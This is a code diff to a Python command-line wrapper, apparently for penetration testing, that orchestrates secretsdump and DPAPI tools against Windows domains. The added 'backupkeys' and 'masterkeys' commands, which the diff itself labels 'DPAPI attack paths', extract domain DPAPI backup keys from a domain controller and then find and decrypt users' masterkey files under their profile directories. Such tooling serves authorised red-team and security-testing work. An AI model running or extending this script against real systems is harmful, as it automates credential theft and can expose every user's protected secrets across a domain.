@@ -2,10 +2,9 @@
 import argparse
 import subprocess
 import shutil
-import sys
+import os,sys,re
 import logging
-
-__version__ = "0.2"
+__version__ = "0.3"
 
 def check_tool(name):
     """Ensure a tool is in PATH or exit."""
@@ -70,6 +69,26 @@ def decrypt(args):
     output = run_cmd(cmd, capture_output=True)
     print(output.strip())
 
+def backupkeys(args):
+    """Extract domain backup DPAPI keys via secretsdump."""
+    tool = check_tool(args.secretsdump_cmd or "secretsdump.py")
+    cmd = [tool, args.target, "-just-dpapi", "-system"] + args.backup_args
+    run_cmd(cmd)
+
+def masterkeys(args):
+    """List and decrypt local user DPAPI masterkeys."""
+    import glob
+    import os
+    tool = check_tool(args.dpapi_cmd or "dpapi_tools.py")
+    pattern = os.path.join(args.path, "*", "AppData", "Roaming", "Microsoft", "Protect", "*", "*key*")
+    files = glob.glob(pattern)
+    if not files:
+        logging.warning(f"No masterkey files found under: {pattern}")
+    for f in files:
+        logging.info(f"Decrypting masterkey file: {f}")
+        cmd = [tool, "decrypt", f, "--backupkey", args.backupkey_file] + args.masterkey_args
+        run_cmd(cmd)
+
 def main():
     parser = argparse.ArgumentParser(
         description=f"DPAPI Wrapper v{__version__} - manage bloodyAD, secretsdump, and DPAPI decryption tools"
@@ -101,6 +120,18 @@ def main():
     p_decrypt.add_argument("decrypt_args", nargs=argparse.REMAINDER, help="Arguments for DPAPI decryption tool")
     p_decrypt.set_defaults(func=decrypt)
 
+    # New commands for additional DPAPI attack paths
+    p_backup = subparsers.add_parser("backupkeys", help="Extract domain backup DPAPI keys via secretsdump")
+    p_backup.add_argument("target", help="Target DC (e.g., DOMAIN/USER or host)")
+    p_backup.add_argument("backup_args", nargs=argparse.REMAINDER, help="Additional secretsdump args")
+    p_backup.set_defaults(func=backupkeys)
+
+    p_master = subparsers.add_parser("masterkeys", help="List and decrypt local user DPAPI masterkeys")
+    p_master.add_argument("path", help="Base directory to search for masterkey files, e.g. C:\\Users")
+    p_master.add_argument("--backupkey-file", required=True, help="Path to DPAPI domain backup key file")
+    p_master.add_argument("masterkey_args", nargs=argparse.REMAINDER, help="Additional dpapi_tools decrypt args")
+    p_master.set_defaults(func=masterkeys)
+
     args = parser.parse_args()
     logging.basicConfig(
         level=logging.DEBUG if args.verbose else logging.INFO,
@@ -110,3 +141,5 @@ def main():
 
 if __name__ == "__main__":
     main()
+##
+##
